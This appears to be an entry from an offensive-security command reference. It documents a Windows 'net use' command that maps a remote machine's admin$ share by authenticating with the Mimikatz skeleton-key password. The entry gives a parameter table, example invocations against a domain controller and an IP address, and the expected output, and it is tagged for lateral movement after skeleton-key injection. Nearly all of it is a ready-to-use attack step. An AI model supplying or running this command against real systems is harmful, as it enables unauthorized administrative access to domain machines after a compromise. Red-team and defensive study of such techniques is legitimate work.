---
type: command
executor: cmd
data: 'net use p: \\TARGET_HOSTNAME\admin$ /user:TARGET_USERNAME mimikatz'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - lateral-movement
  - skeleton-key
verified: true
validated: true
---

# net-use-map-admin-share

## Command

```cmd
net use p: \\TARGET_HOSTNAME\admin$ /user:TARGET_USERNAME mimikatz
```

## Description

Maps a remote Windows admin share (admin$) to a local drive letter (P:) using the skeleton key password "mimikatz" for authentication. This command is used post-skeleton key injection to access administrative resources on domain machines without original credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| p: | Local drive letter to map the share to | Yes |
| \\TARGET_HOSTNAME | Target machine's hostname or IP (e.g., WIN-PTELU2U07KG) | Yes |
| admin$ | Hidden administrative share | Yes |
| /user:TARGET_USERNAME | Domain username to authenticate as (e.g., john) | Yes |
| mimikatz | Fixed skeleton key password | Yes |

## Examples

### Basic Usage

```cmd
net use p: \\DC01\admin$ /user:administrator mimikatz
```

### With IP Address

```cmd
net use p: \\10.0.0.5\admin$ /user:john mimikatz
```

## Expected Output

The command completed successfully.

New connections will be remembered.

There are no entries in the list to disconnect.

## Related

- [[procedures/Skeleton-Key-Password-Injection-with-Mimikatz]]
- [[commands/rdesktop-rdp-login]]
